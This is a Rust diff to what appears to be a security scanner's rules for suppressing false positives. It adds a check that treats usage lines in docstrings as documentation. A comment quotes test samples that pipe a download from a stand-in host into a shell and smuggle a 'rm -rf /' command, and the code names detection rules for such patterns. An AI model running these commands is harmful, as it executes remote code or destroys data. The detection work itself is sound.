@@ -692,8 +692,13 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
         // `expect(tokenizeArgs("... curl evil.sh | sh"))` and
         // `assert.throws(() => mod.sanitizeCodexArgs(['; rm -rf /']))` were
         // reported as a pipe-to-shell and as a destructive command.
-        "DL_PIPE_TO_SHELL" | "SHELL_DESTRUCTIVE" | "SHELL_EVAL" | "SHELL_EXEC"
-        | "NET_HTTP_CLIENT" | "NET_FETCH_CALL" => looks_like_test(&line),
+        "DL_PIPE_TO_SHELL" | "SHELL_DESTRUCTIVE" | "SHELL_EVAL" | "NET_HTTP_CLIENT"
+        | "NET_FETCH_CALL" => looks_like_test(&line),
+        // A docstring that documents how to run the skill is not the skill
+        // running it. Widening SHELL_EXEC to catch `python3 foo.py` also caught
+        // `Usage: python add_slide.py <unpacked_dir> <source>` in every
+        // docstring. Comments are handled separately; these are usage text.
+        "SHELL_EXEC" => looks_like_usage(&line),
         // A quoted phrase, a heading, a list item or a table cell is
         // documentation *about* the pattern, not an instruction to the agent.
         // GOLD-v5 put every sampled `PI_*` finding in that bucket: the corpus is
@@ -757,6 +762,17 @@ fn is_documentation_or_quoted(line: &str, matched: &str) -> bool {
     ['"', '\'', '`']
         .iter()
         .any(|q| before.matches(*q).count() % 2 == 1)
+}
+
+/// Does the line document how to run something (a usage line in a docstring)?
+fn looks_like_usage(line: &str) -> bool {
+    line.contains("usage:")
+        || line.contains("用法")
+        || line.contains("示例")
+        || line.contains("example:")
+        || ((line.contains("python") || line.contains("node") || line.contains("sh "))
+            && line.contains('<')
+            && line.contains('>'))
 }
 
 /// Does the line look like a test assertion or fixture?
